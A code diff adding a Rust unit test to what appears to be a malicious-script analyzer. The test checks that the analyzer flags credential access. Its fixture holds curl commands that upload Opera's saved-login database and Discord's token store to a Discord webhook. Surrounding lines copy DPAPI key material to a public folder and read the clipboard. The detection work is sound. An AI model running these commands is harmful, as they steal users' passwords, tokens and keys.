@@ -5200,6 +5200,35 @@ copy "%APPDATA%\Microsoft\Protect\SID\BK-MACHINE" C:\Users\Public\bk.bin
     }
 
     #[test]
+    fn curl_uploads_of_browser_and_discord_stores_emit_credential_access_traits() {
+        let script = br#"curl --silent --output /dev/null -F l=@"C:\Users\puncher\AppData\Roaming\Opera Software\Opera Stable\Login Data" https://discord.com/api/webhooks/1/token
+curl --silent --output /dev/null -F level=@"C:\Users\puncher\AppData\Roaming\discord\Local Storage\leveldb\%%f" https://discord.com/api/webhooks/1/token
+"#;
+        let report = analyze(script, &AnalyzeConfig::default());
+
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CredentialAccess { technique, target }
+                    if technique == "browser-cred-path"
+                        && target.contains(r"Opera Software\Opera Stable\Login Data")
+            )),
+            "Opera credential upload path was not surfaced: {:?}",
+            report.traits
+        );
+        assert!(
+            report.traits.iter().any(|t| matches!(
+                t,
+                Trait::CredentialAccess { technique, target }
+                    if technique == "discord-token-store"
+                        && target.contains(r"discord\Local Storage\leveldb\%%f")
+            )),
+            "Discord token store upload path was not surfaced: {:?}",
+            report.traits
+        );
+    }
+
+    #[test]
     fn powershell_dotnet_clipboard_access_emits_input_capture_trait() {
         let script = br#"powershell -Command "[System.Windows.Forms.Clipboard]::GetText()"
 powershell -Command "[Windows.Forms.Clipboard]::SetText('copied')"
